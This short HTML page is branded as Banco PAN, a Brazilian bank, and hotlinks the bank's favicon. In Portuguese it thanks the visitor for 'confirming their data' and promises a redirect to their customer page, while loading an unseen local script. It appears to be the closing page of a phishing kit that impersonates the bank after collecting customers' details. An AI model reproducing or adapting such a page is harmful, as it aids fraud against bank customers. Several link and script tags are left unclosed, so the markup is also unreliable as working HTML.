<!doctype html>
<html lang="pt-BR">

<head>
  <!-- Required meta tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <!-- Bootstrap CSS -->

  <link rel="shortcut icon" type="image/x-icon"
    href="https://www.bancopan.com.br/lumis-theme/br/com/bancopan/institucional/theme/banco-pan-institucional/estrutura/assets/img/favicon.ico">

  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"

  <title>Banco PAN</title>
</head>

<style>
  .spinner-border {
    width: 8rem;
    height: 8rem;
  }
</style>

<body>

  <!-- Principal -->
  <main class="container text-center mt-5">
    <section class="title">
      <h1>Obrigado por confirmar seus dados!</h1>
      <h4 class="mt-3">Em alguns instantes você será redirecionado para sua página de cliente.</h4>
    </section>

    <section class="spinner-border text-primary my-5" role="status">
      <span class="sr-only">Loading...</span>
    </section>

    <section class="mt-5">
      <div class="form-group mt-5">
        <a href="/" class="btn btn-primary">Voltar para Tela Inicial</a>
      </div>
    </section>
  </main>



  <script src="https://code.jquery.com/jquery-3.6.1.js" integrity="sha256-3zlB5s2uwoUzrXK3BT7AX3FyvojsraNFxCc2vC/7pNI="

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"

  <script type="text/javascript" src="../static/js/index.js"></script>
